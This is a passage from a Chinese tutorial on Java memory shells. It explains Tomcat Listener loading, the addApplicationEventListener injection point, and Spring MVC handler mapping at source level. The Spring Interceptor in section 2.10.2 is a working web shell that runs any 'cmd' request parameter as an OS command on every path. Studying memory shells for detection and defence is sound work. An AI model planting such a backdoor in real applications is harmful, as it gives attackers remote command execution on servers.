![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGiccDLBCwKs0iaTFncVqqhpt3f986Ricfc0VVyNibWvvZjHpVRM3wh4bp2g/640?wx_fmt=png&from=appmsg)

由上图可知，`Listener`是最先被加载的，所以根据前面我们学到的思路，我动态注册一个恶意的`Listener`，就又可以形成一种内存马了。

在`tomcat`中，常见的`Listener`有以下几种：

*   `ServletContextListener`，用来监听整个`Web`应用程序的启动和关闭事件，需要实现`contextInitialized`和`contextDestroyed`这两个方法；
    
*   `ServletRequestListener`，用来监听`HTTP`请求的创建和销毁事件，需要实现`requestInitialized`和`requestDestroyed`这两个方法；
    
*   `HttpSessionListener`，用来监听`HTTP`会话的创建和销毁事件，需要实现`sessionCreated`和`sessionDestroyed`这两个方法；
    
*   `HttpSessionAttributeListener`，监听`HTTP`会话属性的添加、删除和替换事件，需要实现`attributeAdded`、`attributeRemoved`和`attributeReplaced`这三个方法。
    

很明显，`ServletRequestListener`是最适合做内存马的，因为它只要访问服务就能触发操作。

2.8 编写一个简单的 Listener（ServletRequestListener）
--------------------------------------------

我们继续用我们之前在`2.2`中搭建的环境，替换掉之前的`TestFilter.java`，重新写一个`TestListener.java`：

```
package org.example;

import javax.servlet.*;
import javax.servlet.annotation.WebListener;

@WebListener("/test")
public class TestListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println("[+] destroy TestListener");
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("[+] initial TestListener");
    }
}


```

运行结果：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG0HdWib60H9axZIVBNXIiaA2maN4CPW86xPbGtKFrKeM7TSatj5NoGR5A/640?wx_fmt=png&from=appmsg)

2.9 从代码层面分析 Listener 运行的整体流程
----------------------------

我们在如图所示的两个地方下断点调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGiaEYtClvjLiboOoicDnyL7Rw5j2ZlRicNFtKAhbHOLsaibDBFhWGACZOevw/640?wx_fmt=png&from=appmsg)

往下翻可以看到`org.apache.catalina.core.StandardContext#listenerStart`方法的调用：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGwh4sc4J13BciahCT4x9puvrXFYibwKhALHnfQNs88ibNJh4JsfHoKf7cA/640?wx_fmt=png&from=appmsg)

代码写的通俗易懂，主要有两个事情要干，一是通过`findApplicationListeners`找到这些`Listerner`的名字；二是实例化这些`listener`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGxZWEK0PJUFfibfrSB07tOqIyVicxdxa7dNOhN4ZLYDye7w7sIKrvEpcg/640?wx_fmt=png&from=appmsg)

接着就是分类摆放，我们需要的`ServletRequestListener`被放在了`eventListeners`里面：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGoPnoIMmXY1Hd5FVne8z2qmK1HnlUFvicbpQ4X6OkgYkpdia7QlAeXJXA/640?wx_fmt=png&from=appmsg)

分类摆放完了之后，干这样一件事情：

```
eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));


```

`Arrays.asList(...)` 好理解，意思就是将数组转换为列表；`eventListeners.addAll(...)`也好理解，意思就是将括号里面的内容添加到之前实例化的监听器列表 `eventListeners` 中。关于括号里边的`org.apache.catalina.core.StandardContext#getApplicationEventListeners`这个方法，我们点进去看，代码如下：

```
@Override
public Object[] getApplicationEventListeners() {
    return applicationEventListenersList.toArray();
}


```

也很简单明了，就是把`applicationEventListenersList`转换成一个包含任意类型对象的数组，也就是一个可能包含各种类型的应用程序事件监听器的数组。

那这总结起来就一句话，就是`Listener`有两个来源，一是根据`web.xml`文件或者`@WebListener`注解实例化得到的`Listener`；二是`applicationEventListenersList`中的`Listener`。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的`addFilterConfig`这种函数呢？当然是有的，`ctrl+左键`往上找：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGDoicBZBu4JcrsQ2sGnbia0z70AjjmOr0MuSDXQLdicJpNTNLOng6lPChg/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGwoTcrzh4FuXYCPQa4ibNGd6jUtVuBEMeIU6YI1iamJ3NDMczX7JiaVKjA/640?wx_fmt=png&from=appmsg)

方法名字叫做`addApplicationEventListener`，在`StandardContext.java`里面，代码如下，完美符合我们的需求，真是太哇塞了：

```
public void addApplicationEventListener(Object listener) {
    applicationEventListenersList.add(listener);
}


```

2.10 简单的 spring 项目搭建
--------------------

新建个项目，设置`Server URL`为`https://start.aliyun.com/`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGf72MRI6tYwZ57Tiaib0S6iapSiaf002cCyKhQqB0zC31F8Z1JzczmH23Vg/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGhyg8EVPfASGcECbxKXYVnVyeBQ9iarKd8VicicniblGeSktj6wIP1emMUQ/640?wx_fmt=png&from=appmsg)

等待依赖解析完成：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGdDPoVOibfrNuAjiacDa1tQTCWt87L6nXQKMlD6IMwWEK9RjZBVL9Wa7A/640?wx_fmt=png&from=appmsg)

这里给我们准备了一个示例，我们可以直接跑起来：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGZM0ibytn6VVSiavcM4Rk71gbKXmyoz4ic2jreQDwlh8pT4szxlv5dJDIw/640?wx_fmt=png&from=appmsg)

### 2.10.1 编写一个简单的 Spring Controller

```
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class TestController {
    @ResponseBody
    @RequestMapping("/")
    public String test(){
        return "hello world";
    }
}


```

非常地简单：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGJywfONbrdfUicy1qRb9x556NGYpbEQ7t36iby5QKt3NqUkRIC4sjdOibA/640?wx_fmt=png&from=appmsg)

### 2.10.2 编写一个简单的 Spring Interceptor

`TestInterceptor.java`：

```
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class TestInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if(cmd != null){
            try {
                java.io.PrintWriter writer = response.getWriter();
                String output = "";
                ProcessBuilder processBuilder;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    processBuilder = new ProcessBuilder("cmd.exe", "/c", cmd);
                }else{
                    processBuilder = new ProcessBuilder("/bin/sh", "-c", cmd);
                }
                java.util.Scanner inputScanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter("\\A");
                output = inputScanner.hasNext() ? inputScanner.next(): output;
                inputScanner.close();
                writer.write(output);
                writer.flush();
                writer.close();
            } catch (Exception ignored){}
            return false;
        }
        return true;
    }
}


```

`WebConfig.java`：

```
package org.example.springcontrollermemoryshellexample.demos.web;

import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new TestInterceptor()).addPathPatterns("/**");
    }
}


```

`Controller`就是之前写的`TestController.java`，运行后访问`http://127.0.0.1:8080/?cmd=whoami`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG2nQQ5aP6z2k6IZSSib5hJwnKp928jos7PKvzODDy7GmWloUDRcQMibPQ/640?wx_fmt=png&from=appmsg)

### 2.10.3 编写一个简单的 Spring WebFlux 的 Demo（基于 Netty）

我们先聊聊怎么自己写一个`Spring WebFlux`框架的`demo`。

这里我们新建一个`SpringBoot`项目，取名`WebFluxMemoryShellDemo`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGiaWy0tfCiadLpK4qLNtws0YErXFNSU8rgsXRa9VGnTps5ka3D6mqOVkw/640?wx_fmt=png&from=appmsg)

这里选择`Spring Reactive Web`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGePEDDoCMuDL4IwAXo0dndKYcU9E6ExxYcWf087B3w9iaoZamcUckINA/640?wx_fmt=png&from=appmsg)

接着新建两个文件，这里为了方便，我把这两个文件放到`hello`文件夹下。

`GreetingHandler.java`：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;
import org.springframework.web.reactive.function.BodyInserters;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

@Component
public class GreetingHandler {
    public Mono<ServerResponse> hello(ServerRequest request) {
        return ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue("Hello, Spring!"));
    }
}


```

`GreetingRouter.java`：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.MediaType;
import org.springframework.web.reactive.function.server.*;

@Configuration
public class GreetingRouter {
    @Bean
    public RouterFunction<ServerResponse> route(GreetingHandler greetingHandler) {
        return RouterFunctions.route(RequestPredicates.GET("/hello").and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);
    }
}


```

我们可以新建`main/resources`文件夹，然后新建`application.properties`，通过`server.port`来控制`netty`服务的端口：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGWPiajiciccgOoeGDeRy5a7ib7ILlIXrqicxIDiczUlDKKyia9gSpgkicEibicTTg/640?wx_fmt=png&from=appmsg)

接着我们运行：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGVwmGSiaVMLpfxpiclbxBclco99Iyc3cesyrqicNXwGps03vlqRasc8HIA/640?wx_fmt=png&from=appmsg)

这里我从`github`上找了一个项目，也可以很好地帮助我们理解这个框架是如何使用的，它采用的是`Netty`+`SpringWebFlux`：

> https://github.com/Java-Techie-jt/springboot-webflux-demo

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGia6IZbNTZMLtRkcB86iciaf030GFiapILvS4u4aMWC7eRkRa76qfT2dnRA/640?wx_fmt=png&from=appmsg)

随便访问个路由。例如`http://127.0.0.1:9191/customers/stream`：

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG7ums7zxBN7zcoQSmDFcEdLWw9ZyYMQnPVBIVDGVm8zkN9VkaeLHUiag/640?wx_fmt=gif&from=appmsg)

2.11 Spring MVC 介绍
------------------

如果想要深入理解`Spring MVC`框架型内存马，那么对`Spring MVC`的基础了解是非常必要的，本节就从源码层面和大家简单聊聊这个框架。

首先引用《`Spring in Action`》上的一张图（这里我重制了一下）来了解`Spring MVC`的核心组件和大致处理流程（不过我在第五版书上貌似没有找到这张图，有找到的小伙伴可以公众号后台私信我）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGagmT6m6zT1jCIMgEAP3OGj1m9oeC4fa9GWv6IS3SWHnYuibMBm6rW2Q/640?wx_fmt=png&from=appmsg)

可以看到，这里有一堆名词，我们一一来看：

*   `DispatcherServlet`是前端控制器，它负责接收`Request`并将`Request`转发给对应的处理组件；
    
*   `HandlerMapping`负责完成`url`到`Controller`映射，可以通过它来找到对应的处理`Request`的`Controller`；
    
*   `Controller`处理`Request`，并返回`ModelAndVIew`对象，`ModelAndView`是封装结果视图的组件；
    
*   ④~⑦表示视图解析器解析`ModelAndView`对象并返回对应的视图给客户端。
    

还有一个概念需要了解，就是`IOC`容器，因为这个名词会在本文后面的内容中提及。

`IOC`（控制反转）容器是`Spring`框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。`IOC`容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。`Spring`框架提供了多种实现`IOC`容器的方式，下面讲两种常见的：

*   `BeanFactory`：`Spring`的最基本的`IOC`容器，提供了基本的`IOC`功能，只有在第一次请求时才创建对象。
    
*   `ApplicationContext`：这是`BeanFactory`的扩展，提供了更多的企业级功能。`ApplicationContext`在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。
    

### 2.11.1 Spring MVC 九大组件

这九大组件需要有个印象：

`DispatcherServlet`（派发`Servlet`）：负责将请求分发给其他组件，是整个`Spring MVC`流程的核心；`HandlerMapping`（处理器映射）：用于确定请求的处理器（`Controller`）；`HandlerAdapter`（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；`HandlerInterceptor`（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；`Controller`（控制器）：处理用户请求并返回适当的模型和视图；`ModelAndView`（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；`ViewResolver`（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；`LocaleResolver`（区域解析器）：处理区域信息，用于国际化；`ThemeResolver`（主题解析器）：用于解析`Web`应用的主题，实现界面主题的切换。

### 2.11.2 简单的源码分析

#### 2.11.2.1 九大组件的初始化

首先是找到`org.springframework.web.servlet.DispatcherServlet`，可以看到里面有很多组件的定义和初始化函数以及一些其他的函数：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGxtaibDQaZfYEdSLlT0IYemGEn8PjbQqfM49dibATbFdbaQUEkFTVLZicA/640?wx_fmt=png&from=appmsg)

但是没有`init()`函数，我们翻看其父类`FrameworkServlet`的父类`org.springframework.web.servlet.HttpServletBean`的时候发现有`init`函数：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG6KLMayiaVe7bOp1oAry51h2rv0W8BI4DS65AlavKO68uoibwCZwmL2FA/640?wx_fmt=png&from=appmsg)

代码如下：

```
@Override
public final void init() throws ServletException {

    // Set bean properties from init parameters.
    PropertyValues pvs = new ServletConfigPropertyValues(getServletConfig(), this.requiredProperties);
    if (!pvs.isEmpty()) {
        try {
            BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(this);
            ResourceLoader resourceLoader = new ServletContextResourceLoader(getServletContext());
            bw.registerCustomEditor(Resource.class, new ResourceEditor(resourceLoader, getEnvironment()));
            initBeanWrapper(bw);
            bw.setPropertyValues(pvs, true);
        }
        catch (BeansException ex) {
            if (logger.isErrorEnabled()) {
                logger.error("Failed to set bean properties on servlet '" + getServletName() + "'", ex);
            }
            throw ex;
        }
    }

    // Let subclasses do whatever initialization they like.
    initServletBean();
}


```

先是从`Servlet`的配置中获取初始化参数并创建一个`PropertyValues`对象，然后设置`Bean`属性；关键在最后一步，调用了`initServletBean`这个方法。

我们点进去之后发现该函数并没有写任何内容，说明应该是子类继承的时候`override`了该方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGeOiaiccibKQPcicvZAxOa9a7P4gAv0KSibkiaNjZSWG7I6gsuX0Bb9n7gDsQ/640?wx_fmt=png&from=appmsg)

果不其然，我们在`org.springframework.web.servlet.FrameworkServlet`中成功找到了该方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGOm44IR2A3oN53wVr0F5rQwegh1NZG4Eo1omDeWd9oxKks9swyg7TcQ/640?wx_fmt=png&from=appmsg)

代码如下：

```
@Override
protected final void initServletBean() throws ServletException {
    getServletContext().log("Initializing Spring " + getClass().getSimpleName() + " '" + getServletName() + "'");
    if (logger.isInfoEnabled()) {
        logger.info("Initializing Servlet '" + getServletName() + "'");
    }
    long startTime = System.currentTimeMillis();

    try {
        this.webApplicationContext = initWebApplicationContext();
        initFrameworkServlet();
    }
    catch (ServletException | RuntimeException ex) {
        logger.error("Context initialization failed", ex);
        throw ex;
    }

    if (logger.isDebugEnabled()) {
        String value = this.enableLoggingRequestDetails ?
                "shown which may lead to unsafe logging of potentially sensitive data" :
                "masked to prevent unsafe logging of potentially sensitive data";
        logger.debug("enableLoggingRequestDetails='" + this.enableLoggingRequestDetails +
                "': request parameters and headers will be " + value);
    }

    if (logger.isInfoEnabled()) {
        logger.info("Completed initialization in " + (System.currentTimeMillis() - startTime) + " ms");
    }
}


```

这段代码的`log`和计时部分就不说了，我们捡关键的说。它先是调用`initWebApplicationContext`方法，初始化`IOC`容器，在初始化的过程中，会调用到这个`onRefresh`方法，一般来说这个方法是在容器刷新完成后被调用的回调方法，它执行一些在应用程序启动后立即需要完成的任务：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGcwBoqIVEaY7RcNthk1tbHqMd55VhKy6jKJ2fU9OFvbiaI0towjicsyvQ/640?wx_fmt=png&from=appmsg)

跟入该方法，可以看到其中默认为空：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGym9L0mCOEfHTQ4FqpyVsodaJZJMWSlAAx3XzUAhgia8akbTe02aGqng/640?wx_fmt=png&from=appmsg)

说明在它的子类中应该会有`override`，果然我们定位到了`org.springframework.web.servlet.DispatcherServlet#` 方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGF9vGibWNZJC0GiagF8J0ibB8pScs0v1noI7yjqZYcZpZw7IwIKpskJFsQ/640?wx_fmt=png&from=appmsg)

这一下就明了了起来，这不是我们之前提到的九大组件嘛，到这一步就完成了`Spring MVC`的九大组件的初始化。

#### 2.11.2.2 url 和 Controller 的关系的建立

你可能会有这样的一个疑惑：我们是用`@RequestMapping("/")`注解在方法上的，那`Spring MVC`是怎么根据这个注解就把对应的请求和这个方法关联起来的？

从上面的九大组件的初始化中可以看到，有个方法就叫做`initHandlerMappings`，我们点进去详细看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGVicJUEddS9Kx4kxOcQV7GzYuymnUX6bDApiaq3fLB3DxcqbLSyChQyDQ/640?wx_fmt=png&from=appmsg)

这段代码和自带的注释写的也比较通俗易懂，分为两部分，第一部分是去`ApplicationContext`（包括`ancestor contexts`）里面找所有实现了`HandlerMappings`接口的类，如果找到了至少一个符合条件的`HandlerMapping bean`，那就把它的值转化为列表，并按照 Java 的默认排序机制对它们进行排序，最后将排序后的列表赋值给 `this.handlerMappings`；那如果没有找到，`this.handlerMappings`就依然保持为`null`；如果不需要检测所有处理程序映射，那就尝试从`ApplicationContext`中获取名称为 `handlerMapping` 的`bean`，如果成功获取到了则将其作为单一元素的列表赋值给 `this.handlerMappings`，如果获取失败了，那也没关系，因为人家注释里面讲的很明白，会添加一个默认的`HandlerMapping`，这也就是我们要讲的第二部分的代码。

第二部分说的是，如果之前一套操作下来，`this.handlerMappings`还是为`null`，那么就调用 `getDefaultStrategies` 方法去获取默认的`HandlerMapping`，并将其赋给 `this.handlerMappings`。

这么一看的话，`org.springframework.web.servlet.DispatcherServlet#getDefaultStrategies`这个方法还是挺关键的，我们点进去看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGnqRx72g4NS1kyBgaVBAhoYP35Q2c7sMGHcrjT1EDj6AWA8oM1CG9Zw/640?wx_fmt=png&from=appmsg)

这段代码挺有意思，先是加载资源文件，并将其内容以属性键值对的形式存储在`defaultStrategies`中；接下来从`strategyInterface`获取一个名称，然后用这个名称在`defaultStrategies`中查找相应的值，如果找到了，就将这个值按逗号分隔成类名数组，接着遍历这个类名数组，对于每个类名都执行以下两个操作：①尝试通过`ClassUtils.forName`方法加载该类 ②使用`createDefaultStrategy`方法创建该类的实例；最后将创建的策略对象添加到列表`strategies`中并返回。

那就很好奇了，这段代码中的`DEFAULT_STRATEGIES_PATH`里面有啥？`Ctrl+左键`追踪：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGEl6W6FFMRIticezM10n9PSWAuvWibA0yucBHYogZDxjRMe4OLHzeiamQA/640?wx_fmt=png&from=appmsg)

原来是一个名叫`DispatcherServlet.properties`的文件，我们可以在左侧的依赖列表里面很快地翻到它，因为它应该是和`DispatcherServlet.java`在一块儿的：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGdXJEvQ76gdkHXTQJqmPYR1lJzs38Q4a4TH2xnn7Y004ktuxo8pa76Q/640?wx_fmt=png&from=appmsg)

从文件内容中，我们可以很快地锁定关键信息：

```
org.springframework.web.servlet.HandlerMapping=org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,\
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,\
	org.springframework.web.servlet.function.support.RouterFunctionMapping


```

也就是说，会有三个值，分别是`BeanNameUrlHandlerMapping`、`RequestMappingHandlerMapping`和`RouterFunctionMapping`，我们一般用的是第二个，我们点进`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`看一下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGEXvTPp2YWibGvvNy8ccT7JZqIxCmzfCuTxVQCF6gUoSjaZhTM38Ngkw/640?wx_fmt=png&from=appmsg)

它的父类`RequestMappingInfoHandlerMapping`的父类`AbstractHandlerMethodMapping`实现了`InitializingBean`这个接口，这个接口用于在`bean`初始化完成后执行一些特定的自定义初始化逻辑。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG7s6KeJjvqBXpriaksEicEbeALjhulWG3q0YHS3FU6Ct2s01RlcR2rBNw/640?wx_fmt=png&from=appmsg)

点进该接口，只有一个`afterPropertiesSet`方法，关于该方法的用途可以参考`https://www.python100.com/html/U711CO7MV79C.html`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG5BpLN2zv9HItFofb2jFmR5u4jte8oat865U2FvYfKjHQx798IEruew/640?wx_fmt=png&from=appmsg)

那我们就看看`AbstractHandlerMethodMapping`它是具体咋实现`InitializingBean`的`afterPropertiesSet`的吧：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG9kicUg9M2gZ6VXdVDwGOS6MWyge8dbZNx2A4HWy0XfmZm5POqU6WpqA/640?wx_fmt=png&from=appmsg)

重写的也很简单，调用`initHandlerMethods`这个方法，继续跟踪该方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGlqicFQbSiaAg6KmnC1WnJrVJUzMHuHiaWQ9FdHGGRK1rMyNSUbc74CJxw/640?wx_fmt=png&from=appmsg)

注释里面写的很清楚：扫描`ApplicationContext`中的`bean`，然后检测并注册`handler methods`。

我们在`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#initHandlerMethods`这里打下断点进行调试，到图中这一步之后`step into`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGwUvfkibaA7cibrrYz8mmJFPpjLFTcZhvVWw5QjWgic2ricmZk3OCDr2eTQ/640?wx_fmt=png&from=appmsg)

我们来看`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#processCandidateBean`这个方法的具体逻辑：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG8hDx0sCsKlIAPibLAL0Mrqvhk8Tv2fvKG8EHeyT2ibNPZ5AUiauyicyPZA/640?wx_fmt=png&from=appmsg)

这里我们自然很好奇，这个`isHandler`是判断啥的，我们点进去看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGCC3fYJb09WVRF7icpZrrIcwQsaraDmy1wibgMLaAiciat0JGY84xVVYDZQ/640?wx_fmt=png&from=appmsg)

可以看到，这里并没有给出实现，说明子类中应该会给出`override`，于是直接找到了`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#isHandler`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG3Ureuuo6ibZ1287XYPShlc3zPmibOJ8eSEibWh1V9g8ZtE1gSQ2tUjIdA/640?wx_fmt=png&from=appmsg)

很明显，`isHandler`是用来检测给定的`beanType`类是否带有`Controller`注解或者`RequestMapping`注解。

解决了这个，继续往后看，后面是调用了`detectHandlerMethods`这个方法，我们点进去看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG5eRicpnRwSOzcZRwZicUD6gTMv4ffQkcwZQDOib96CnepMBn6aMw0wg6g/640?wx_fmt=png&from=appmsg)

我们分开来看，首先是这行代码，它是综合起来写的，意思是说，先判断`handler`是否是字符串类型，如果是，则通过`ApplicationContext`获取它的类型；否则，直接获取`handler`的类型。：

```
Class<?> handlerType = (handler instanceof String ?
            obtainApplicationContext().getType((String) handler) : handler.getClass());


```

然后是这部分：

```
Class<?> userType = ClassUtils.getUserClass(handlerType);
Map<Method, T> methods = MethodIntrospector.selectMethods(userType,
        (MethodIntrospector.MetadataLookup<T>) method -> {
            try {
                return getMappingForMethod(method, userType);
            }
            catch (Throwable ex) {
                throw new IllegalStateException("Invalid mapping on handler class [" +
                        userType.getName() + "]: " + method, ex);
            }
        });


```

先是获取处理器的用户类，用户类是没有经过代理包装的类，这样就可以确保获取到的是实际处理请求的类；然后是这个`selectMethods`方法，这个方法有两个参数，第一个参数就是用户类，第二个参数是一个回调函数。关键就在于理解这个回调函数的作用。对于每个方法，它会尝试调用`getMappingForMethod`来获取方法的映射信息。

我们点进这个方法，发现它是一个抽象方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGlj4nibuibNlK5PyRur8kXib2LTpMvECicWI4tvlXslKDiaOPaPkV8n3sfLg/640?wx_fmt=png&from=appmsg)

那就去看看他的子类中有没有对应的实现，直接定位到`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#getMappingForMethod`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGtJTiaQZDGDQ5g2ozjxOjvzF1uqyHBQDiaHlj9dZ1dXbtW9Yr3MFfAjGg/640?wx_fmt=png&from=appmsg)

我们在下图所示位置打断点调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG2Cp196XtZWBibogJQBrcrvzbASQJlV1Iq27HTdKkACwGsZO5DGpr5cw/640?wx_fmt=png&from=appmsg)

分开来看，首先是第一行：

```
RequestMappingInfo info = createRequestMappingInfo(method);


```

解析`Controller`类的方法中的注解，生成一个对应的`RequestMappingInfo`对象。我们可以`step into`进入`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)`方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGGulaqkdaLl8LIwPt0K3mVdZbb3pWECVibhPZVDrRRRdHpDI99TpvibVA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGUibDmV8Fw8W8qHpfT5VPq6ictLU86vfunZMP5sdWeBy0WlU48kZLZVEA/640?wx_fmt=png&from=appmsg)

可以看到这个`info`里面保存了访问该方法的`url pattern`是`"/"`，也就是我们在`TestController.java`所想要看到的当`@RequestMapping("/")`时，调用`test`方法。

继续一步步往下走，可以看到走到了`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#detectHandlerMethods`的最后：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGknmRVnXjOG7bSYpdTvyK5F40icWKYuw8iaBHIBicUIuvon2javYDsaIicQ/640?wx_fmt=png&from=appmsg)

直接看`lambda`表达式里面的内容：

```
